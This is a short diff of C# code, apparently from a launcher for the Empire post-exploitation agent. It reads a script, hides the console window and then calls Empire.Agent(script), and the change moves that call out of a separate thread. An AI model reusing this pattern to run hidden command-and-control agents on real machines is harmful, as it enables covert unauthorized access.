@@ -59,11 +59,9 @@
             string script = reader.ReadToEnd();
 
             ShowConsoleWindow();
-            new Thread(() =>
-            {
-                Empire.Agent(script);
-            }).Start();
             HideConsoleWindow();
+            Empire.Agent(script);
+            
         }
 
         public static void ShowConsoleWindow()
